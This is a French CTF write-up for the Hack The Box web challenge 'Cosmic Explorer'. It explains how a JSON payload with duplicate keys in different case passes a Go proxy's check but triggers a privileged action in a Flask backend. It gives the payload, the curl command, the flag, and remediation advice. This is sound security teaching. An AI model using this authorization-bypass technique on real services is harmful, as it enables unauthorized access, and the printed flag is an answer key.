---
tags:
  - writeup/htb
  - ctf
  - web-security
  - json-parsing-differential
  - authentication-bypass
  - microservices
---

# Cosmic Explorer — Web (HTB)

**Flag :** `HTB{C0SM1C-BYP4SS}`
**Catégorie :** Web
**Vulnérabilité :** JSON Parser Differential (case-sensitivity mismatch)

---

## Architecture

Le challenge expose deux services chaînés :

- **Frontend Go** (`:8080`) — sert l'UI et agit comme proxy/validateur. Reçoit les requêtes utilisateur, les valide, puis forward vers le backend.
- **Backend Flask** (`:8081`) — service interne non exposé publiquement, détient le flag.

Le frontend n'accepte en apparence que l'action `getcosmic` et bloque `getSecureCode` :

```go
switch requestData.Action {
case "getcosmic":
    resp, err := http.Post("http://localhost:8081/execute", "application/json", bytes.NewBuffer(body))
    // ... forward du body BRUT vers le backend
case "getSecureCode":
    w.Write([]byte("Access denied: Invalid security clearance"))
}
```

Le backend, lui, renvoie le flag pour `getSecureCode` :

```python
elif data['action'] == "getSecureCode":
    return jsonify({"flag": os.getenv("FLAG", "HTB{flag_not_set}"), ...})
```

---

## La vulnérabilité

Le point critique : **le frontend Go forward le body HTTP brut** (`bytes.NewBuffer(body)`) vers le backend, sans le re-sérialiser. Les deux services parsent donc le **même texte JSON**, mais avec des règles différentes.

| Parser | Comportement sur les clés |
|--------|---------------------------|
| **Go `encoding/json`** | Match des champs de struct **case-insensitive** : `action`, `Action`, `ACTION` remplissent tous le champ `Action`. Sur clés dupliquées, la **dernière** valeur gagne. |
| **Flask `request.get_json()`** | Accès dict **case-sensitive** : `data['action']` ne lit QUE la clé `action` exacte. `Action` est ignoré. |

Cette divergence permet de faire lire **deux valeurs différentes** au même payload.

---

## Exploitation

Payload :

```json
{"action":"getSecureCode","Action":"getcosmic"}
```

Déroulé :

1. **Go** applique le match case-insensitive. `action` et `Action` visent le même champ ; la dernière clé du JSON (`"Action":"getcosmic"`) l'emporte → `requestData.Action == "getcosmic"` → **le case `getcosmic` matche → forward du body brut**.
2. **Flask** reçoit le body identique et lit strictement `data['action']` → `"getSecureCode"` → **renvoie le flag**.

Le frontend croit avoir validé une requête bénigne ; le backend exécute la requête privilégiée.

### Commande

```bash
curl -X POST http://TARGET_IP:PORT/execute \
  -H "Content-Type: application/json" \
  -d '{"action":"getSecureCode","Action":"getcosmic"}'
```

### Résultat

```json
{"flag":"HTB{C0SM1C-BYP4SS}","name":"Captain's Log","src":"..."}
```

---


## Remédiation

La règle de fond : **ne jamais laisser deux composants re-parser indépendamment la même entrée.**

1. **Re-sérialiser côté frontend.** Après validation, Go devrait reconstruire un JSON propre à partir de sa struct plutôt que forwarder le body brut :
   ```go
   cleanBody, _ := json.Marshal(requestData)
   http.Post("http://localhost:8081/execute", "application/json", bytes.NewBuffer(cleanBody))
   ```
   Le backend ne voit alors que ce que Go a réellement interprété.

2. **Rejeter les clés dupliquées.** Utiliser un décodeur strict (`json.Decoder` avec `DisallowUnknownFields`, ou une validation explicite) pour refuser les payloads ambigus.

3. **Canonicalisation.** Normaliser la casse et la structure avant toute décision d'autorisation.

4. **Défense en profondeur.** Le backend ne devrait pas exposer d'action privilégiée en se reposant uniquement sur la validation d'un autre service. Chaque service valide ses propres entrées.

---


